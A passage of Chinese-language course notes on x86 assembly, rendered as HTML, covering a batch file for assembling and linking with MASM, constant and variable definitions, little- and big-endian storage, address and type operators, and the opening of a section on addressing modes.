<div class="language-batch highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#note-cs-asm-wk1_2-__codelineno-12-1"></a><span class="c1">REM make32.bat, for assembling and linking 32-bit Console programs (.EXE)</span>
</span></code></pre></div>
<ul>
<li><code>REM</code> 是批处理文件中的注释命令，说明文件的用途：用于汇编和链接32位控制台程序。</li>
</ul>
<div class="language-batch highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#note-cs-asm-wk1_2-__codelineno-13-1"></a>BIN\ML /c /coff /Fl /Zi <span class="nv">%1</span>.asm
</span></code></pre></div>
<ul>
<li>调用 <code>ML</code>（Microsoft Macro Assembler）进行汇编：<ul>
<li><code>/c</code>：只汇编，不链接。</li>
<li><code>/coff</code>：生成COFF（通用目标文件格式）。</li>
<li><code>/Fl</code>：生成源代码列表文件。</li>
<li><code>/Zi</code>：生成用于调试的完整符号信息。</li>
<li><code>%1.asm</code>：表示命令行传递的第一个参数，即汇编源文件的名称。</li>
</ul>
</li>
</ul>
<p><div class="language-batch highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#note-cs-asm-wk1_2-__codelineno-14-1"></a><span class="k">if</span> <span class="k">errorlevel</span> <span class="mi">1</span> <span class="k">goto</span> <span class="nl">terminate</span>
</span></code></pre></div>
  - 检查上一条命令的返回码 (<code>errorlevel</code>) 是否大于或等于1（表示错误）。如果是，跳转到 <code>:terminate</code> 标签，结束批处理。</p>
<div class="language-batch highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#note-cs-asm-wk1_2-__codelineno-15-1"></a>BIN\LINK32 /subsystem:console /debug <span class="nv">%1</span>.obj
</span></code></pre></div>
<ul>
<li>调用 <code>LINK32</code>（Microsoft 32-bit Linker）进行链接：<ul>
<li><code>/subsystem:console</code>：指定子系统为控制台应用程序。</li>
<li><code>/debug</code>：生成调试信息。</li>
<li><code>%1.obj</code>：表示由上一条汇编命令生成的目标文件。</li>
</ul>
</li>
</ul>
<div class="language-batch highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#note-cs-asm-wk1_2-__codelineno-16-1"></a><span class="k">if</span> <span class="k">errorlevel</span> <span class="mi">1</span> <span class="k">goto</span> <span class="nl">terminate</span>
</span></code></pre></div>
<ul>
<li>再次检查错误码。如果链接命令返回错误，跳转到 <code>:terminate</code> 结束。</li>
</ul>
<div class="language-batch highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#note-cs-asm-wk1_2-__codelineno-17-1"></a><span class="k">DIR</span> <span class="nv">%1</span>.*
</span></code></pre></div>
<ul>
<li>列出指定文件（如生成的可执行文件和其他相关文件）的详细信息。</li>
</ul>
<div class="language-batch highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#note-cs-asm-wk1_2-__codelineno-18-1"></a><span class="p">:</span><span class="nl">terminate</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#note-cs-asm-wk1_2-__codelineno-18-2"></a><span class="p">@</span><span class="k">echo</span> on
</span></code></pre></div>
<ul>
<li><code>:terminate</code> 是批处理文件的标签，表示一个跳转目标。</li>
<li><code>@echo on</code> 打开命令回显。</li>
</ul>
<p>这个批处理文件的作用是自动化汇编源代码并将其链接成32位的可执行程序，同时提供调试信息。批处理文件会在任一阶段（汇编或链接）发生错误时停止执行。</p>
</details></section><section class="print-page" id="note-cs-asm-wk2" heading-number="2.4.4.3.3"><h1 id="note-cs-asm-wk2-_1">数据表示<a class="headerlink" href="#note-cs-asm-wk2-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1635 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 25 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 3 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 6 分钟</p>
</div>
<h2 id="note-cs-asm-wk2-_2">常量表达<a class="headerlink" href="#note-cs-asm-wk2-_2" title="Permanent link">&para;</a></h2>
<p>常量是程序使用的一个确定的数值，在汇编阶段就可以确定，直接编码于指令代码中，而不是保存在存储器中可变的变量</p>
<p>汇编语言支持多种常量的表达形式</p>
<h3 id="note-cs-asm-wk2-_3">常数<a class="headerlink" href="#note-cs-asm-wk2-_3" title="Permanent link">&para;</a></h3>
<p><strong>多种进制的表达</strong>:以后缀字母来区分（D，H，B分别对应10，16，2进制），10进制数可以不加，对于以字母A~F开头的十六进制常数，要加前导的0 以便于区分字母开头的标识符(<code>AH</code>是八位寄存器，<code>0Ah</code>是16进制数)</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<table>
<thead>
<tr>
<th>十进制数</th>
<th>100，255D</th>
</tr>
</thead>
<tbody>
<tr>
<td>十六进制数</td>
<td>64H，0FFH</td>
</tr>
<tr>
<td>二进制数</td>
<td>01101100b</td>
</tr>
</tbody>
</table>
</div>
<h3 id="note-cs-asm-wk2-_4">字符和字符串<a class="headerlink" href="#note-cs-asm-wk2-_4" title="Permanent link">&para;</a></h3>
<p>用<code>''</code>或者<code>""</code>括起来的多个字符 ，每个字符的数值是对应的ASCII码值</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>单引号，双引号没有什么区别，字符和字符串也没有什么本质上的区别</p>
</div>
<h3 id="note-cs-asm-wk2-_5">符号常量<a class="headerlink" href="#note-cs-asm-wk2-_5" title="Permanent link">&para;</a></h3>
<p>允许使用标识符来表达一个数值，在高级程序设计语言中，<code>=</code>用于变量的定义，而在汇编语言中<code>=</code>用来定义符号常量，例如</p>
<p><div class="language-ASM highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-asm-wk2-__codelineno-0-1"></a><span class="nf">Zero</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="c1">;或者Zero equ 0 </span>
</span></code></pre></div>
的作用相当于C语言中</p>
<p><div class="language-C highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-asm-wk2-__codelineno-1-1"></a><span class="cp">#define Zero 0 </span>
</span></code></pre></div>
在接下来的程序里面<code>Zero</code>出现的位置都会被0替代</p>
<h3 id="note-cs-asm-wk2-_6">数值表达式<a class="headerlink" href="#note-cs-asm-wk2-_6" title="Permanent link">&para;</a></h3>
<p>用运算符连结各种常量构成数据表达式，常用的算术运算符有加减乘除等，如果是地址表达式，那么只能加减，表示地址移动的若干的字节存储单元</p>
<h2 id="note-cs-asm-wk2-_7">变量定义<a class="headerlink" href="#note-cs-asm-wk2-_7" title="Permanent link">&para;</a></h2>
<div class="admonition info">
<p class="admonition-title">什么是变量</p>
<p>随程序运行会发生变化的数据，保存在可读可写的主存空间中，变量的实质是主存单元的数据，因而可以改变，变量需要事先定义才能使用，变量具有属性，方便应用</p>
</div>
<p><strong>定义变量的格式</strong></p>
<p>一般格式为</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-cs-asm-wk2-__codelineno-2-1"></a>变量名 变量定义伪指令  初值表
</span></code></pre></div>
<ul>
<li>
<p>变量名：用户定义的标识符，需要满足定义标识符规则，表示首元素的逻辑地址，便于直接访问，<strong>但是，没有变量名并不影响变量的定义</strong></p>
</li>
<li>
<p>伪指令助记符：例如 <code>byte</code>,<code>word</code>,<code>dword</code>,表示变量类型</p>
</li>
<li>
<p>初值表是用逗号分隔的一个或者多个参数，表示变量的初值（汇编中一个变量可以有多个变量值，类似于C语言中的数组）</p>
<ul>
<li>可以是各种形式的常量</li>
<li>使用<code>?</code>来表示初值不确定，即未赋初值，一半会存储为0</li>
<li>使用复制操作符<code>DUP</code>来表示多个同样的数值<code>重复次数 DUP(需要重复的参数)</code></li>
</ul>
</li>
</ul>
<div class="admonition note">
<p class="admonition-title">主要的变量定义伪指令</p>
<p><strong>BYTE</strong>：字节类型，分配一个或者多个字节单元，每个数据是8位字节量，对应C语言中的<code>char</code>类型。</p>
<p><strong>WORD</strong>：字类型，分配一个或者多个字单元，每个数据是16位字量，对应C语言中的<code>short</code>类型。</p>
<p><strong>DWORD</strong>：双字类型，分配一个或者多个双字单元，每个数据是32位双字量对应C语言中的<code>long</code>类型。</p>
</div>
<h3 id="note-cs-asm-wk2-8">8位变量的定义<a class="headerlink" href="#note-cs-asm-wk2-8" title="Permanent link">&para;</a></h3>
<p>可以定义：</p>
<ul>
<li>8位的无符号整数（0~255）</li>
<li>8位补码表示的有符号整数-128~+127</li>
<li>一个字符（ASCII码值）</li>
<li>压缩BCD码0~99</li>
<li>非压缩BCD码0~9</li>
</ul>
<details class="example">
<summary>Example</summary>
<p><div class="language-ASM highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-cs-asm-wk2-__codelineno-3-1"></a><span class="nf">bvar1</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">255</span><span class="p">,</span><span class="o">-</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">+</span><span class="mi">127</span><span class="c1">;对应机器指令为00 80无符号128） FF 80（有符号-128） 00 7F</span>
</span></code></pre></div>
<code>bvar1</code>是首元素0的逻辑地址，要想访问下一个元素需要<code>bvar1+1</code></p>
<p>其数据段为</p>
<table>
<thead>
<tr>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>7FH</td>
</tr>
<tr>
<td>00H</td>
</tr>
<tr>
<td>80H</td>
</tr>
<tr>
<td>FFH</td>
</tr>
<tr>
<td>80H</td>
</tr>
<tr>
<td>00H(<code>bvar1</code>指向这里)</td>
</tr>
</tbody>
</table>
<p><img alt="alt text" src="../NOTE/CS/ASM/image-10.png" /> </p>
</details>
<h3 id="note-cs-asm-wk2-1632">16位和32位变量的定义<a class="headerlink" href="#note-cs-asm-wk2-1632" title="Permanent link">&para;</a></h3>
<p><strong>16位</strong></p>
<ul>
<li>16位无符号整数（0~65535）</li>
<li>16为补码表示的有符号整数（-32768~+32767）</li>
<li>16位段地址</li>
<li>16位偏移地址</li>
</ul>
<p><strong>32位</strong></p>
<ul>
<li>32位无符号整数<span class="arithmatex">\(0 \sim 2^{32}-1\)</span></li>
<li>32位补码表示的有符号整数<span class="arithmatex">\(-2^{31} \sim 2^{31}-1\)</span></li>
<li>32位逻辑地址</li>
</ul>
<details class="example">
<summary>Example</summary>
<div class="language-ASM highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-cs-asm-wk2-__codelineno-4-1"></a><span class="nf">wvar1</span><span class="w"> </span><span class="kt">word</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">32768</span><span class="p">,</span><span class="mi">65535</span><span class="p">,</span><span class="o">-</span><span class="mi">32768</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">+</span><span class="mi">32767</span>
</span></code></pre></div>
<p>要想访问下一个元素，需要<code>wvar1+2</code></p>
<p>每一个元素都使用两个字节来表示
<img alt="alt text" src="../NOTE/CS/ASM/image-11.png" /></p>
<div class="language-ASM highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-cs-asm-wk2-__codelineno-5-1"></a><span class="nf">dvar1</span><span class="w"> </span><span class="kt">dword</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mh">80000000h</span>
</span></code></pre></div>
<p>要想访问下一个元素，需要<code>dvar1+4</code></p>
<p>每一个元素，使用四个字节来表示
<img alt="alt text" src="../NOTE/CS/ASM/image-12.png" /></p>
</details>
<h2 id="note-cs-asm-wk2-_8">变量应用<a class="headerlink" href="#note-cs-asm-wk2-_8" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-asm-wk2-_9">多字节数据的存储顺序<a class="headerlink" href="#note-cs-asm-wk2-_9" title="Permanent link">&para;</a></h3>
<p>最小的存储单位是bit，最常用的存储单位是字节（Byte），一个存储单元保存一个字节量数据，对应一个存储器地址。</p>
<p><strong>小端方式</strong>（little Endian）</p>
<ul>
<li>高字节数据保存在高地址存储单元</li>
<li>低字节数据保存在低地址存储单元</li>
</ul>
<p><strong>大端方式</strong>（Big Endian）</p>
<ul>
<li>高字节数据保存在低地址存储单元</li>
<li>低字节数据保存在高地址存储单元</li>
</ul>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>大端存储和小端存储两个名字来自《格列佛游记》关于如何打开一个鸡蛋的争论: How to open an egg,from the little end or the big end</p>
</div>
<p>80x86采用小段方式存储多字节数据</p>
<p><div class="language-ASM highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-cs-asm-wk2-__codelineno-6-1"></a><span class="nf">bvar</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="mh">39h</span><span class="p">,</span><span class="mh">31h</span><span class="p">,</span><span class="mh">32h</span><span class="p">,</span><span class="mh">38h</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#note-cs-asm-wk2-__codelineno-6-2"></a><span class="nf">wvar</span><span class="w"> </span><span class="kt">word</span><span class="w"> </span><span class="mh">3139h</span><span class="p">,</span><span class="mh">3832h</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#note-cs-asm-wk2-__codelineno-6-3"></a><span class="nf">dvar</span><span class="w"> </span><span class="kt">dword</span><span class="w"> </span><span class="mh">38323139h</span>
</span></code></pre></div>
三个变量在主存中的存放方式是一样的</p>
<p>对于<code>bvar</code>,由低到高依次存放四个字节的数据</p>
<table>
<thead>
<tr>
<th>数据段</th>
</tr>
</thead>
<tbody>
<tr>
<td>38H</td>
</tr>
<tr>
<td>32H</td>
</tr>
<tr>
<td>31H</td>
</tr>
<tr>
<td>39H</td>
</tr>
</tbody>
</table>
<p><code>wvar</code>有两种方式存储</p>
<p>如果是大端存储</p>
<table>
<thead>
<tr>
<th>数据段</th>
</tr>
</thead>
<tbody>
<tr>
<td>32H</td>
</tr>
<tr>
<td>38H</td>
</tr>
<tr>
<td>31H</td>
</tr>
<tr>
<td>39H</td>
</tr>
</tbody>
</table>
<p>如果是小段存储</p>
<table>
<thead>
<tr>
<th>数据段</th>
</tr>
</thead>
<tbody>
<tr>
<td>38H</td>
</tr>
<tr>
<td>32H</td>
</tr>
<tr>
<td>31H</td>
</tr>
<tr>
<td>39H</td>
</tr>
</tbody>
</table>
<p>同理，<code>dvar</code>也有两种方式</p>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>大端方式和小端方式存储都是合理的，不存在哪种方式更好，谁对谁错之分</p>
</div>
<h3 id="note-cs-asm-wk2-_10">变量的地址属性<a class="headerlink" href="#note-cs-asm-wk2-_10" title="Permanent link">&para;</a></h3>
<p>定义后的变量名具有两类属性</p>
<ul>
<li>地址属性：首个变量所在的存储单元的逻辑地址，包含 <strong>段基地址</strong> 和 <strong>偏移地址</strong></li>
<li>类型属性：变量定义的数据单位</li>
</ul>
<p>通过地址操作符可以获得变量的地址属性值</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>[]</code></td>
<td>括起的表达式作为存储器地址指针，整个相当于取括号里的地址的值</td>
</tr>
<tr>
<td><code>$</code></td>
<td>返回当前的偏移地址</td>
</tr>
<tr>
<td><code>OFFSET</code> 变量名</td>
<td>返回变量名所在段的偏移地址</td>
</tr>
<tr>
<td><code>SEG</code> 变量名</td>
<td>返回段基地址（实地址存储模型）</td>
</tr>
</tbody>
</table>
<div class="admonition example">
<p class="admonition-title">Example</p>
<div class="language-ASM highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-cs-asm-wk2-__codelineno-7-1"></a><span class="c1">;数据段</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#note-cs-asm-wk2-__codelineno-7-2"></a><span class="nf">bvar</span><span class="w">       </span><span class="kt">byte</span><span class="w"> </span><span class="mh">12h</span><span class="p">,</span><span class="w"> </span><span class="mh">34h</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#note-cs-asm-wk2-__codelineno-7-3"></a><span class="w">           </span><span class="k">org</span><span class="w"> </span><span class="kc">$</span><span class="o">+</span><span class="mi">10</span><span class="c1">;bvar地址为00000000，当前地址为00000002H，相当于数据段的下一个变量从当前地址+10字节再开始</span>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#note-cs-asm-wk2-__codelineno-7-4"></a><span class="nf">array</span><span class="w">      </span><span class="kt">word</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">,</span><span class="w"> </span><span class="mi">7</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">,</span><span class="w"> </span><span class="mi">9</span><span class="p">,</span><span class="w"> </span><span class="mi">10</span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#note-cs-asm-wk2-__codelineno-7-5"></a><span class="nf">wvar</span><span class="w">       </span><span class="kt">word</span><span class="w"> </span><span class="mh">5678h</span><span class="w"> </span>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#note-cs-asm-wk2-__codelineno-7-6"></a><span class="nf">arr_size</span><span class="w">   </span><span class="err">=</span><span class="w"> </span><span class="kc">$</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">array</span><span class="w"> </span><span class="c1">;计算出当前地址到array地址一共占有多少字节</span>
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#note-cs-asm-wk2-__codelineno-7-7"></a><span class="nf">arr_len</span><span class="w">    </span><span class="err">=</span><span class="w"> </span><span class="nv">arr_size</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">2</span><span class="c1">;计算出一共有多少内存空间</span>
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#note-cs-asm-wk2-__codelineno-7-8"></a><span class="nf">dvar</span><span class="w">       </span><span class="kt">dword</span><span class="w"> </span><span class="mh">9abcdef0h</span>
</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#note-cs-asm-wk2-__codelineno-7-9"></a><span class="c1">;代码段</span>
</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#note-cs-asm-wk2-__codelineno-7-10"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">al</span><span class="p">,</span><span class="w"> </span><span class="nv">bvar</span><span class="c1">;相当于[bvar]取出第一个元素12H送到al</span>
</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#note-cs-asm-wk2-__codelineno-7-11"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">ah</span><span class="p">,</span><span class="w"> </span><span class="nv">bvar</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="c1">;取出第二个，类似于数组的操作</span>
</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#note-cs-asm-wk2-__codelineno-7-12"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">bx</span><span class="p">,</span><span class="w"> </span><span class="nv">wvar</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="c1">;从wvar开始再+2，指向了dvar的最低字节F0，赋给了bx</span>
</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#note-cs-asm-wk2-__codelineno-7-13"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">ecx</span><span class="p">,</span><span class="w"> </span><span class="nv">arr_len</span><span class="c1">; 将arr_len所代表的长度11传给ecx</span>
</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#note-cs-asm-wk2-__codelineno-7-14"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">edx</span><span class="p">,</span><span class="w"> </span><span class="kc">$</span><span class="w"> </span><span class="c1">; 将当前的（指令）地址传给edx，即代码段地址+偏移地址</span>
</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#note-cs-asm-wk2-__codelineno-7-15"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">esi</span><span class="p">,</span><span class="w"> </span><span class="nv">offset</span><span class="w"> </span><span class="nv">dvar</span><span class="c1">;将dvar的数据段地址传递给esi，即数据段地址+22H</span>
</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#note-cs-asm-wk2-__codelineno-7-16"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">edi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">esi</span><span class="p">]</span><span class="c1">;将esi的值作为地址取出该地址的元素，即9abcdef0h</span>
</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#note-cs-asm-wk2-__codelineno-7-17"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">ebp</span><span class="p">,</span><span class="w"> </span><span class="nv">dvar</span><span class="c1">;9abcdef0h</span>
</span></code></pre></div>
</div>
<h3 id="note-cs-asm-wk2-_11">变量的类型属性<a class="headerlink" href="#note-cs-asm-wk2-_11" title="Permanent link">&para;</a></h3>
<p>变量的类型属性表示变量定义的数据单位，BYTE，WORD，DWORD对应的类型值为1，2，4；即其所占的字节数</p>
<p><strong>类型操作符</strong></p>
<ul>
<li><code>类型名 PTR  变量名</code>，将变量名按照指定的类型使用</li>
<li><code>TYPE 变量名</code> 返回占用字节空间的字量数值</li>
<li><code>LENGTHOF 变量名</code>:返回整个变量的数据项数</li>
<li><code>SIZEOF 变量名</code>:返回整个变量所占用的字节数</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>在上例中，若有<code>mov eax,dword ptr array</code>，则是将array当作双字类型访问，会把<code>00020001H</code>传递给eax</p>
</div></section><section class="print-page" id="note-cs-asm-wk3" heading-number="2.4.4.3.4"><h1 id="note-cs-asm-wk3-_1">寻址方式<a class="headerlink" href="#note-cs-asm-wk3-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 376 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 10 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 1 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 1 分钟</p>
</div>
<p>指令由操作码和操作数组成，操作码是处理器要执行哪种操作，用助记符表示；操作数是指令执行的参与者，是各种操作的对象，需要通过地址指示</p>
<p>需要通过地址访问数据或者指令</p>
<ul>
<li>
<p>数据寻址：指令执行过程中，访问所需要操作的数据（操作数）</p>
<ul>
<li>立即数寻址：数据在指令代码中，用于常量表达</li>
<li>寄存器寻址：数据在寄存器中，用寄存器名表示</li>
<li>存储器寻址：数据在主存中，用存储器地址代表</li>
<li>I/O寻址：数据在外设（I/O设备）中，用I/O地址代表</li>
</ul>
</li>
<li>
<p>指令寻址：一条指令执行后，确定执行的下一条指令的位置</p>
</li>
</ul>
<h2 id="note-cs-asm-wk3-_2">立即数寻址<a class="headerlink" href="#note-cs-asm-wk3-_2" title="Permanent link">&para;</a></h2>
<p>操作数紧跟操作码，是机器码的一部分</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>操作数从指令代码中得到，即立即数（Immediate）</p>
</div>
<details class="example">
<summary>例</summary>
<p><div class="language-ASM highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-asm-wk3-__codelineno-0-1"></a><span class="nf">MOV</span><span class="w"> </span><span class="nb">EAX</span><span class="p">,</span><span class="mh">33221100H</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-cs-asm-wk3-__codelineno-0-2"></a><span class="c1">;机器代码: B8 00 11 22 33</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-cs-asm-wk3-__codelineno-0-3"></a><span class="c1">;操作码: B8</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-cs-asm-wk3-__codelineno-0-4"></a><span class="c1">;立即数 ： 33221100</span>
</span></code></pre></div>
机器码的排列方式说明是小端存储，<code>B8</code> 代表将一个数传递到EAX，<code>33221100H</code> 就是那个数
<img alt="alt text" src="../NOTE/CS/ASM/image-13.png" /></p>
</details>
<p><strong>各种立即数形式</strong></p>
<ul>
<li>十六进制常数</li>
<li>字符(ASCII 码值)</li>
<li>十进制负数(补码)</li>
<li>符号常量</li>
<li>表达式</li>
